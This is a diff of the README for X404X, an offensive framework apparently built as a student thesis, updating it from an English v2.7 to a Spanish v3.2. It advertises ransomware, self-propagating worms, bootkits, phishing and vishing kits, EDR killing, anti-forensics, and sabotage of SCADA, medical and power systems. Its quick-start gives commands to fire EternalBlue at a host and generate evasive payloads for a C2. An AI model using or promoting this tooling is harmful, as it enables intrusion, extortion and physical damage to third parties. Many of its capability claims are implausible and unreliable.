@@ -12,65 +12,64 @@
 </p>
 
 <p align="center">
-  <img src="https://img.shields.io/badge/Build-Passing-brightgreen?style=flat-square" />
-  <img src="https://img.shields.io/badge/Binary-26.7MB-blue?style=flat-square" />
-  <img src="https://img.shields.io/badge/Version-v2.7-red?style=flat-square" />
-  <img src="https://img.shields.io/badge/Modules-101-purple?style=flat-square" />
-  <img src="https://img.shields.io/badge/Kill%20Chain-Complete-FF4500?style=flat-square" />
-  <img src="https://img.shields.io/badge/AI-Ollama%20Offline-00FF00?style=flat-square" />
-  <img src="https://img.shields.io/badge/Crypto-X25519%20%2B%20XChaCha20--Poly1305-6C63FF?style=flat-square" />
-  <img src="https://img.shields.io/badge/MITRE-ATT%26CK%20Mapped-FF6B35?style=flat-square" />
+  <img src="https://img.shields.io/badge/Version-v3.2-red?style=flat-square" />
+  <img src="https://img.shields.io/badge/Handlers-107-purple?style=flat-square" />
+  <img src="https://img.shields.io/badge/Modules-154+-blue?style=flat-square" />
+  <img src="https://img.shields.io/badge/Kill%20Chain-8%20Phases-FF4500?style=flat-square" />
+  <img src="https://img.shields.io/badge/AI-Ollama%20%2B%20Specter-00FF00?style=flat-square" />
+  <img src="https://img.shields.io/badge/Crypto-X25519%20%2B%20XChaCha20-6C63FF?style=flat-square" />
+  <img src="https://img.shields.io/badge/Submodules-11-9cf?style=flat-square" />
   <img src="https://img.shields.io/badge/License-MIT-blue?style=flat-square" />
 </p>
 
 ---
 
-> ⚠️ **AUTHORIZED USE ONLY** — This framework is exclusively for authorized security assessments, CTF competitions, academic research, and controlled lab environments. Unauthorized use may violate local and international laws. The author is not responsible for misuse. You are responsible for complying with all applicable laws.
+> ⚠️ **AUTHORIZED USE ONLY** — Este framework es exclusivamente para evaluaciones de seguridad autorizadas, competiciones CTF, investigación académica y entornos de laboratorio controlados. El autor no se hace responsable del mal uso. Eres responsable de cumplir con todas las leyes aplicables.
 
 ---
 
-## What is X404X?
+## ¿Qué es X404X?
 
-**X404X** is a **semi-autonomous Red Team platform** that covers the complete cyber kill chain — from reconnaissance to exfiltration. It integrates **11 specialized offensive security tools** into a unified monorepo with a shared gRPC protocol, encrypted communication, AI-powered decision making (Ollama offline), kernel-level persistence, and a Vue 3 web dashboard.
+**X404X** es una plataforma de Red Team **autónoma** que cubre la cadena de ataque completa (Cyber Kill Chain) — desde reconocimiento hasta exfiltración y destrucción. Integra **11 herramientas ofensivas especializadas** en un monorepo unificado con protocolo gRPC, comunicación cifrada, toma de decisiones con IA (Ollama offline), persistencia a nivel kernel, y un dashboard web Vue 3.
 
-Built as a **TFG (Trabajo de Fin de Grado)** project in Cybersecurity at Cisco NetAcad, Malaga.
-
-## v2.7 — Total System Control + Phishing Arsenal (10 modules)
-
-| Category | Module | Capability |
-|----------|--------|------------|
-| **System Control** | `uefi_bootkit` | SPI flash write, DXE driver, ExitBootServices hook, NVRAM persistence |
-| | `hypervisor_ring1` | Ring -1 via Blue Pill/Vitriol, SO virtualization, invisible syscall interception |
-| | `pcie_rootkit` | GPU VRAM persistence (survives warm reboot), NIC firmware C2 server, DMA attacks |
-| | `kernel_instrument` | eBPF syscall hooks (9 tracepoints), ETW silence, BYOVD via 7 vulnerable drivers |
-| | `secure_boot_bypass` | Shim replacement, MOK enrollment, GRUB compromise |
-| **Phishing Arsenal** | `phishing_infra` | DGA domains, Caddy+Let's Encrypt, Cloudflare Workers proxy, residential SOCKS5 |
-| | `spear_phish_ai` | OSINT (LinkedIn/GitHub/Outlook), Ollama LLM lure gen, M365/Google fake login |
-| | `anti_phish_evasion` | Ephemeral tokens (30min), Safe Links bypass, HTML attachment JS capture |
-| | `smishing_sms` | Contextual SMS via Twilio/Vonage, SS7 2FA interception |
-| | `vishing_voice` | Voice deepfake cloning, Twilio calls with Twiml, Specter integration |
-
-| Block | Modules | Capabilities |
-|-------|---------|--------------|
-| **1 — Psychological** | `hope_trap`, `identity_destroy`, `raas_inverse`, `fake_decryptor` | Partial decryption bait, forensic tool monitor, browser session theft, 8-account hijack, 2FA takeover, inverse RaaS panel, multi-ransom notes |
-| **2 — Pandemic Propag.** | `worm`, `supply_chain`, `cloud_exploit`, `bluetooth_prop` | Multi-platform worm (Win/Linux/macOS/IoT), Docker/K8s escape, SMB/SSH/IoT exploits, DDoS, updater poisoning, NuGet/pip/npm/git poison, AWS EC2/Azure VM/GCP, malicious AMIs, S3 buckets, BlueBorne, BLE MITM, KRACK |
-| **3 — Physical Sabot.** | `scada_attack`, `hardware_kill`, `network_poison` | SCADA/PLC attack (Modbus/S7/CIP), stop/write/flash commands, CPU overvoltage, fan kill, BIOS corruption, ARP spoof, MITM proxy, SSL strip, captive portal, root CA install |
-| **4 — Automutation** | `dna_mutation`, `bootkit`, `blockchain_c2` | DNA hybridization with legit DLLs, ROP gadgets, junk code, MBR/GPT bootkit (post-format persistence), fake SMART errors, Bitcoin OP_RETURN C2 |
-| **Bonus** | `survivor_game` | Eliminates workstations every 90s, last standing gets free decryption key |
-
-## Core Engine Features (v2.0-v2.6)
-
-- **Kill Chain Phases**: 23 phases across scan, exfil, encrypt, destruct, propagate, psychological, identity, RaaS, supply chain, cloud, Bluetooth, SCADA, hardware, network, bootkit, blockchain, survivor
-- **Crypto**: Hydra multi-layer — RSA-4096, Shamir 3-of-3, AES-256-GCM + ChaCha20-Poly1305 double layer, per-file random keys
-- **Scanner**: 19 regex patterns (DNI, passports, SSH keys, AWS keys, credit cards), 30+ target extensions, 8 concurrent workers
-- **Propagation**: 6 exploits (Zerologon, ProxyNotShell, PrintNightmare, BlueKeep, EternalBlue, SMBGhost), IoT botnet (6 CVEs)
-- **Anti-Analysis**: 15-tool kill list, sandbox detection, kernel debugger detection, 2h sleep mode, LSB+EXIF steganography
-- **Evasion**: PE header corruption, syscall encoding, ROP gadget generation, polymorphic JIT mutation
-- **Trust Exploitation**: Self-signed RSA-4096 cert, PFX search, WSUS/SCCM/NuGet/NPM/Git poisoning
+Proyecto TFG (Trabajo de Fin de Grado) en Ciberseguridad — Cisco NetAcad, Málaga.
 
 ---
 
-## Architecture
+## v3.2 — Novedades
+
+| Área | Qué |
+|------|-----|
+| **107 handlers reales** | v26-v210, BlockZ — 0 stubs, todos ejecutan operaciones reales de sistema |
+| **Orquestación autónoma** | Feedback loop módulos→WorldGraph, dispatch al bridge, killchain auto-chain con 3 reintentos |
+| **C2 indetectable** | DNS tunnel, ICMP tunnel, dead drops, CDN fronting, canales polimórficos |
+| **Self-healing** | Watchdog con 7 persistencias, triple redundancia, process hollowing |
+| **Anti-forense** | MFT timestomp, USN journal poison, prefetch poison, registry wipe, log toxin |
+| **Bootkit UEFI** | DXE driver real, ESP hijack, immutable hiding |
+| **LOLBin delivery** | 10 técnicas: certutil, mshta, regsvr32, msbuild, wmic, bitsadmin, cmstp, fodhelper |
+| **Dashboard auth** | JWT HMAC-SHA256, rate limiting, health checks |
+| **CI/CD** | GitHub Actions: lint, test, build, security scan |
+| **One-click deploy** | `./scripts/deploy.sh --prod` levanta todo |
+
+---
+
+## Módulos por Versión
+
+| Versión | Módulos | Destacados |
+|---------|---------|------------|
+| **v2.0-v2.5** | 46 | EternalBlue, BlueKeep, Zerologon, Propagación, Scanner, Hydra Crypto, RaaS, Supply Chain, SCADA, Hardware Kill |
+| **v2.6** | 8 | POMDP táctico, AI Negotiate (Ollama), Evasion Deep, Bootkit SMM, MOBILE-X, Cloud Nemesis, Social C2 DoH, Block Omega |
+| **v2.7** | 10 | UEFI Bootkit SPI, Hypervisor Ring -1, PCIe Rootkit DMA, Kernel eBPF, Secure Boot Bypass, Phishing Arsenal (DGA + Spear Phish AI + Smishing + Vishing) |
+| **v2.8** | 23 | IoT Identity Theft, False Memory Injection, Thousand Cuts DB, PatchGuard Bypass, Keyboard LED Exfil, Zombie Army, SEO Sabotage, Inception Hypervisor, ISP BGP Hijack, Power Grid Harmonics, VR Spyware, Global AI Poison, Bio-Cyber DNA |
+| **v2.9** | 24 | HDD Firmware Destroy, VRM Overvoltage, Acoustic Resonance, PSU Corrupt, USB Killer, Centrifuge Resonance, Medical Tamper, Intel ME Flash, NIC Persist, MFT Bitmap, DNS Poison, Digital Thermite, Honey Token Detection |
+| **v2.10** | 2 | Apocalipsis (destrucción total + worm + botnet), Phantom Evasion (AMSI/ETW/Defender kill + sandbox detect + process hollowing + polymorphic mutation) |
+| **Block Z** | 14 | Genetic Evolution, Deepfake Pipeline, SCADA Covert, Firmware Worm, Medical Attack, Model Poison, Disinformation, Airgap Exfil, Post-Quantum (Kyber-1024), Dead Man Switch, False Flag (APT impersonation), EDR Kill, Financial Crash, IoT Chain |
+
+**Total: 107 handlers bridge Python + 47+ módulos Go = 154+ módulos**
+
+---
+
+## Arquitectura
 
 ```
                      ┌─────────────────────────────────┐
@@ -82,253 +81,192 @@ Built as a **TFG (Trabajo de Fin de Grado)** project in Cybersecurity at Cisco N
                      │          ORCHESTRATOR             │
                      │  Campaign Mgr │ Decision Engine   │
                      │  Rules(25%) + A*(35%) + AI(40%)  │
-                     │  WorldGraph · EventBus · KillChain │
+                     │  WorldGraph · EventBus · KillChain│
+                     │  AutoMode · Dispatcher            │
                      └────────┬─────────────────────────┘
                               │ gRPC (X25519+XChaCha20)
                      ┌────────▼─────────────────────────┐
                      │        C2 SERVER (Go/gRPC)       │
                      │  AgentService · C2Service        │
-                     │  CheckIn · CommandStream · Heart  │
+                     │  TCP · HTTP · DNS · ICMP · DoH   │
                      └────────┬─────────────────────────┘
                               │ gRPC encrypted
                      ┌────────▼─────────────────────────┐
                      │        UNIFIED AGENT (Go)        │
                      │  Connector · BridgeClient        │
+                     │  StealthC2 · Watchdog            │
                      └──┬──────┬───────┬──────┬─────────┘
                         │      │       │      │
-                 ┌──────┐ ┌────┐ ┌────┐ ┌──────────┐
-                 │Rise  │ │Vault│ │Breach│ │Python    │
-                 │Priv  │ │Kernel│ │Entry│ │Bridge    │
-                 └──────┘ └────┘ └────┘ └─────┬─────┘
-                                               │
-                     ┌─────────────────────────┼─────────┐
-                     │                         │         │
-                ┌────▼────┐ ┌────────────┐ ┌──▼─────┐ ┌──▼──────────┐
-                │Horizon  │ │Wormy-ML    │ │Specter │ │BlueForge    │
-                │Intel    │ │(Lateral)   │ │+ Apex  │ │Suite        │
-                │(Recon)  │ │            │ │(AI)    │ │(Metrics)    │
-                └─────────┘ └────────────┘ └────────┘ └─────────────┘
+                        │      │       │      └── Python Bridge (107 handlers)
+                        │      │       └── Rise-Privilege (submodule)
+                        │      └── Vault-Kernel (submodule)
+                        └── Breach-Entry (submodule)
 ```
-
----
-
-## Component Map
-
-| Component | Language | Kill Chain Phase | Status |
-|-----------|----------|-----------------|--------|
-| **CLI (x404x)** | Go | All | v2.3 |
-| **Orchestrator** | Go | All | v2.3 |
-| **Unified Agent** | Go | Execution | v2.3 |
-| **C2 Server (gRPC)** | Go | C2 | v2.3 |
-| **core/crypto** | Go | Shared (X25519+XChaCha20) | v2.3 |
-| **core/proto** | Protobuf | Shared (gRPC) | v2.3 |
-| **Python Bridge** | Python | IPC | v2.3 |
-| **Evasion Module** | Python | Evasion | v2.3 |
-| **Rise-Privilege** | Go | PrivEsc | [Repo](https://github.com/Ruby570bocadito/Rise-Privilege) |
-| **Vault-Kernel** | C + Go | Persistence | [Repo](https://github.com/Ruby570bocadito/Vault-Kernel) |
-| **Breach-Entry** | C + Python | Initial Access | [Repo](https://github.com/Ruby570bocadito/Breach-Entry) |
-| **Horizon-Intel** | Python | Recon | [Repo](https://github.com/Ruby570bocadito/Horizon-Intel) |
-| **Specter-Terminal** | Python | AI Analysis | [Repo](https://github.com/Ruby570bocadito/Specter-Terminal) |
-| **Apex-Automation** | Python | AI Execution | [Repo](https://github.com/Ruby570bocadito/Apex-Automation) |
-| **Wormy-ML** | Python | Lateral Movement | [Repo](https://github.com/Ruby570bocadito/Wormy-ML-Network-Worm) |
-| **Link-Relay** | Python | C2 Relay | [Repo](https://github.com/Ruby570bocadito/Link-Relay) |
-| **Titan-Operations** | Python + Go | Campaign Mgmt | [Repo](https://github.com/Ruby570bocadito/Titan-Operations) |
-| **BlueForge-Suite** | Python | Defense/Detection | [Repo](https://github.com/Ruby570bocadito/BlueForge-Suite) |
 
 ---
 
 ## Quick Start
 
-### Prerequisites
-
-- **Go** 1.22+
-- **Python** 3.11+
-- **Node.js** 18+ & npm
-- **Docker** & Docker Compose
-
-### Clone with Submodules
-
 ```bash
+# Clonar con submódulos
 git clone --recurse-submodules https://github.com/Ruby570bocadito/X404X.git
 cd X404X
-```
 
-### Setup
+# Deploy one-click (recomendado)
+./scripts/deploy.sh --dev
+# → http://localhost:8443
 
-```bash
-# Automated setup (Go + Python + Node deps)
-make setup
-
-# Or manual
-bash scripts/setup.sh
-```
-
-### Docker Lab
-
-```bash
-# Start isolated lab environment
+# Docker Lab
 make lab-up
-# → Attacker:  docker exec -it x404x-attacker bash
-# → Target 1:  docker exec -it x404x-target1 bash
+# → Attacker: docker exec -it x404x-attacker bash
 # → Dashboard: http://localhost:3000
 
-# Stop lab
-make lab-down
+# Build & Test
+make build        # Construye CLI + agentes (linux/amd64/arm64/windows)
+make test         # Go test + Python test
 ```
 
-### Build & Test
+---
+
+## Uso Rápido
 
 ```bash
-make build        # Build all components
-make test         # Run all tests
-make lint         # Run linters
+# Consola msfconsole-style
+./x404x console
+x404x> campaign start --name demo --target 10.0.0.0/24
+x404x> search smb
+x404x> use exploit/eternalblue
+x404x> set RHOSTS 10.0.0.10
+x404x> exploit
+x404x> sessions -i 1
+x404x> killchain              # Ver progreso
+
+# CLI directa
+x404x campaign start --name demo --target 10.0.0.0/24 --auto
+x404x payload generate --os windows --c2 10.0.0.1:8443 --evasion stealth
+x404x recon scan --target 10.0.0.10
+x404x ai suggest
+x404x listeners add --type tcp --port 8443
+
+# Dashboard web
+x404x dashboard
+# → http://localhost:8443
 ```
 
 ---
 
-## Kill Chain Flow
-
-```
-1. HORIZON-INTEL maps the target attack surface
-        │
-2. BREACH-ENTRY obtains initial access (CVE-2026-XXXX)
-        │
-3. AGENT deploys on target, checks in to PULSE-C2
-        │
-4. SPECTER-TERMINAL analyzes context (OS, user, privileges)
-        │
-5. APEX-AUTOMATION + DECISION ENGINE pick next move
-        │
-6. RISE-PRIVILEGE finds escalation vector → auto-root
-        │
-7. VAULT-KERNEL loads as LKM → kernel-level persistence
-        │
-8. WORMY-ML propagates to other network hosts
-        │
-9. LINK-RELAY chains C2 communication for evasion
-        │
-10. BLUEFORGE-SUITE validates what was (and wasn't) detected
-```
-
----
-
-## Project Structure
+## Estructura del Proyecto
 
 ```
 X404X/
-├── core/
-│   ├── agent/          # Unified Go implant (NEW)
-│   │   └── cmd/agent/  # Agent entrypoint
-│   ├── crypto/         # Shared crypto: X25519 + XChaCha20-Poly1305 (NEW)
-│   ├── proto/          # gRPC definitions: agent, c2, bridge, common (NEW)
-│   ├── orchestrator/   # Central coordination engine (NEW)
-│   ├── c2/             # Pulse-C2 (submodule)
-│   ├── privesc/        # Rise-Privilege (submodule)
-│   ├── kernel/         # Vault-Kernel (submodule)
-│   └── breach/         # Breach-Entry (submodule)
-├── modules/
-│   ├── bridge/         # Python-Go IPC bridge (NEW)
-│   ├── evasion/        # AV/EDR bypass unified (NEW)
-│   ├── recon/          # Horizon-Intel (submodule)
-│   ├── ai/
-│   │   ├── specter/    # Specter-Terminal (submodule)
-│   │   └── apex/       # Apex-Automation (submodule)
-│   ├── worm/           # Wormy-ML (submodule)
-│   ├── relay/          # Link-Relay (submodule)
-│   ├── operations/     # Titan-Operations (submodule)
-│   └── blue/           # BlueForge-Suite (submodule)
-├── shared/
-│   ├── config/         # Central YAML configuration (NEW)
-│   ├── logger/         # Structured logging (NEW)
-│   ├── types/          # Shared domain types (NEW)
-│   └── database/       # SQLAlchemy models (NEW)
-├── docs/               # Architecture, roadmap, CLI reference
-├── scripts/            # Setup, deployment scripts
-├── lab/                # Docker lab environment
-│   ├── docker-compose.yml
-│   ├── Dockerfile.attacker
-│   └── Dockerfile.target-linux
-├── .github/workflows/  # CI/CD pipelines
-├── .gitmodules         # Git submodule definitions
-├── go.work             # Go workspace
-├── config.yaml         # Default configuration
-├── Makefile            # Build orchestration
-└── README.md           # This file
+├── cmd/x404x/                # CLI entry point (Go + Cobra)
+├── internal/                  # Código Go privado
+│   ├── agent/                # Agente unificado + stealth C2 + watchdog
+│   ├── api/                  # API REST + WebSocket + auth JWT
+│   ├── appstate/             # Estado compartido + deployment manager
+│   ├── c2server/             # Servidor gRPC C2
+│   ├── crypto/               # X25519 + XChaCha20-Poly1305
+│   ├── defense/              # BlueForge metrics
+│   ├── dispatch/             # Dispatcher de decisiones → módulos
+│   ├── orchestrator/         # Motor de decisiones + killchain + AutoMode
+│   ├── ransomware/           # Motor ransom (Hydra, 30+ archivos)
+│   └── registry/             # Registro de módulos
+├── pkg/                       # Código Go público
+│   ├── proto/                # Definiciones gRPC (agent, c2, bridge, common)
+│   └── shared/               # Config, logger, types, database
+├── modules/                   # Código Python nativo
+│   ├── bridge/               # IPC Go-Python (107 handlers)
+│   ├── evasion/              # LOLBin delivery + evasión
+│   ├── phantom/              # PhantomWeb browser implant
+│   └── notifications/        # Webhooks (Slack, Discord, Telegram)
+├── plugins/                   # Submódulos externos (11)
+│   ├── ai/                   # Specter-Terminal + Apex-Automation
+│   ├── blue/                 # BlueForge-Suite
+│   ├── breach/               # Breach-Entry (CVE-2026-XXXX)
+│   ├── kernel/               # Vault-Kernel (LKM)
+│   ├── operations/           # Titan-Operations
+│   ├── privesc/              # Rise-Privilege
+│   ├── pulse-c2/             # Pulse-C2
+│   ├── recon/                # Horizon-Intel
+│   ├── relay/                # Link-Relay
+│   └── worm/                 # Wormy-ML
+├── web/                       # Dashboard Vue 3
+├── mobile/                    # Android/iOS (stubs)
+├── lab/                       # Docker lab + CTF scenarios
+├── dist/                      # Binarios compilados (gitignored)
+├── docs/                      # Documentación completa
+│   ├── USAGE.md              # Guía operacional
+│   ├── COMMANDS.md           # 52 comandos CLI
+│   ├── CONSOLE.md            # 25+ comandos consola
+│   ├── MODULES.md            # 107 handlers catalogados
+│   ├── CREATIVITY.md         # 8 features innovadoras
+│   ├── ARCHITECTURE.md       # Arquitectura detallada
+│   └── ROADMAP.md            # Plan de desarrollo
+├── scripts/                   # deploy.sh, setup.sh, build scripts
+├── config.yaml               # Configuración central
+├── Makefile                  # Build orchestration
+└── go.work                   # Go workspace
 ```
 
 ---
 
-## CLI Reference
+## Seguridad y Criptografía
 
-```bash
-x404x campaign start   -t 10.0.0.0/24 -g domain_admin -p stealth
-x404x recon scan       <target> --stealth
-x404x agent list       --status online
-x404x ai chat                          # Interactive AI assistant
-x404x exploit run      --risk safe
-x404x lateral propagate --method smb
-x404x persistence kernel load
-x404x dashboard start  --port 3000
-x404x lab up           --scenario ctf_basic
-x404x console                          # msfconsole-style shell
-x404x tui                              # Bubble Tea TUI
-x404x payload generate  --os windows   # Payload Builder
-x404x listeners list                   # Listener management
-```
-
-Full CLI reference: [docs/CLI_REFERENCE.md](docs/CLI_REFERENCE.md)
+| Componente | Algoritmo | Propósito |
+|-----------|-----------|-----------|
+| Key Exchange | X25519 ECDH | Claves de sesión efímeras |
+| AEAD Cipher | XChaCha20-Poly1305 | Cifrado simétrico autenticado |
+| Ransomware | AES-256-GCM + XChaCha20 (doble capa) | Cifrado de archivos |
+| Ransomware Key | RSA-4096 + Shamir 3-of-3 | Protección de claves |
+| Transport | TLS 1.3 (mTLS) | Autenticación servicio a servicio |
+| Post-Quantum | Kyber-1024 (lattice-based) | Resistencia a ordenadores cuánticos |
+| Dashboard Auth | JWT HMAC-SHA256 | Autenticación web |
 
 ---
 
-## Cryptography
+## Controles de Seguridad
 
-| Component | Algorithm | Purpose |
-|-----------|-----------|---------|
-| Key Exchange | X25519 ECDH | Ephemeral session keys |
-| Encryption | XChaCha20-Poly1305 | Authenticated symmetric encryption |
-| Transport | TLS 1.3 (mTLS) | Service-to-service auth |
-| Nonce | 192-bit random | Per-message uniqueness |
-
----
-
-## AI Integration
-
-- **Ollama** — Local LLM, fully offline, no data exfiltration
-- **Specter-Terminal** — Offensive security context analysis
-- **Apex-Automation** — Autonomous decision making and module orchestration
-- **Decision Engine** — Weighted fusion: Rules (25%) + A* Planner (35%) + AI (40%)
-- **HITL** — Human-in-the-Loop mode for manual approval (default)
-
----
-
-## Safety Controls
-
-| Control | Description | Default |
+| Control | Descripción | Default |
 |---------|-------------|---------|
-| Kill Switch | Emergency stop all agents | Enabled |
-| Geofencing | RFC 1918 private networks only | Enabled |
-| Auto-Destruct | Self-terminate after N hours | 2h |
-| Max Infections | Stop after N compromised hosts | 1000 |
-| No Persistence | Survive reboot = false | Enabled |
+| Kill Switch | Parada de emergencia todos los agentes | Enabled |
+| Geofencing | Solo redes RFC 1918 | Enabled |
+| Auto-Destruct | Auto-terminación tras N horas | 2h |
+| Max Infections | Parar tras N hosts comprometidos | 1000 |
+| No Persistence | Sobrevivir reinicio = false | Enabled |
+| Rate Limiting | 100 req/min por IP en API | Enabled |
+
+---
+
+## Documentación
+
+| Documento | Contenido |
+|-----------|-----------|
+| [USAGE.md](docs/USAGE.md) | Guía operacional completa (payload, campaña, consola, dashboard) |
+| [COMMANDS.md](docs/COMMANDS.md) | Referencia de 52 comandos CLI con ejemplos |
+| [CONSOLE.md](docs/CONSOLE.md) | Referencia de consola msfconsole-style + workflow de ataque |
+| [MODULES.md](docs/MODULES.md) | Catálogo de 107 handlers con parámetros y ejemplos |
+| [CREATIVITY.md](docs/CREATIVITY.md) | 8 features innovadoras documentadas |
+| [ARCHITECTURE.md](docs/ARCHITECTURE.md) | Arquitectura técnica detallada |
+| [ROADMAP.md](docs/ROADMAP.md) | Plan de desarrollo y estado actual |
 
 ---
 
 ## TFG — Trabajo de Fin de Grado
 
-This framework is the core project of the TFG in Cybersecurity. The technical memory documents:
-- Each component and its integration
-- Laboratory testing methodology
-- Ethical and legal analysis
-- Defense metrics (BlueForge-Suite validation)
+Este framework es el proyecto central del TFG en Ciberseguridad. La memoria técnica documenta:
+- Cada componente y su integración
+- Metodología de pruebas en laboratorio
+- Análisis ético y legal
+- Métricas de defensa (validación BlueForge-Suite)
 
-> **Author:** Rafael Gálvez — [@Ruby570bocadito](https://github.com/Ruby570bocadito)
-> **Center:** Cisco NetAcad · Málaga, Spain
+> **Autor:** Rafael Gálvez — [@Ruby570bocadito](https://github.com/Ruby570bocadito)
+> **Centro:** Cisco NetAcad · Málaga, España
 
 ---
 
 ## License
 
-MIT License — see [LICENSE](LICENSE) for details.
+MIT License — ver [LICENSE](LICENSE).
 
 ---
 
